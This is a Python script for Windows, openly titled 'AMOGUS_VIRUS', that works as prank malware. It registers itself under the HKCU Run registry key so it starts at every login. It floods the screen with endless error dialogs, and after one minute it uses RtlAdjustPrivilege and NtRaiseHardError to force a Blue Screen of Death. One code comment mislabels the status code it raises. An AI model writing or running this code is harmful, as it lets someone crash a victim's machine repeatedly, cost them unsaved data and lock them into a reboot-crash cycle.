import os
import sys
import ctypes
import winreg
import threading

def add_to_autostart(app_name, script_path):
    """
    Adds the script to Windows Registry to run automatically at startup.

    :param app_name: The name of the registry entry.
    :param script_path: The full path to the Python file.
    """
    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)
        print(f"{app_name} successfully added to startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")

def show_windows_error():
    """
    Function to display Windows-style error messages in a loop.
    """
    while True:
        ctypes.windll.user32.MessageBoxW(
            None,
            "Mom, what's happening to my computer?",
            "AMOGUS_VIRUS",
            0x10 | 0x0
        )

def trigger_bsod():
    """
    Function to trigger a Windows Blue Screen of Death (BSOD).
    """
    try:
        # Define necessary types and constants
        RtlAdjustPrivilege = ctypes.windll.ntdll.RtlAdjustPrivilege
        NtRaiseHardError = ctypes.windll.ntdll.NtRaiseHardError

        # Enable the required privilege
        SE_SHUTDOWN_PRIVILEGE = 19
        TRUE = 1
        FALSE = 0
        privilege_enabled = ctypes.c_bool()
        status = RtlAdjustPrivilege(
            SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, ctypes.byref(privilege_enabled)
        )

        if status != 0:
            print(f"Failed to adjust privilege. Status: {status}")
            return

        # Trigger the BSOD
        NTSTATUS_ERROR_CODE = 0xC0000022  # STATUS_ASSERTION_FAILURE
        response = ctypes.c_ulong()
        NtRaiseHardError(
            NTSTATUS_ERROR_CODE, 0, 0, None, 6, ctypes.byref(response)
        )
    except Exception as e:
        print(f"Failed to trigger BSOD: {e}")

if __name__ == "__main__":
    app_name = "MeinPythonScript"  # Registry entry name
    script_path = os.path.abspath(sys.argv[0])  # Full path to the current script
    
    # Add to startup
    add_to_autostart(app_name, script_path)

    # Start error message loop in a separate thread
    error_thread = threading.Thread(target=show_windows_error, daemon=True)
    error_thread.start()

    # Wait for 1 minute and then trigger BSOD
    import time
    time.sleep(60)
    trigger_bsod()
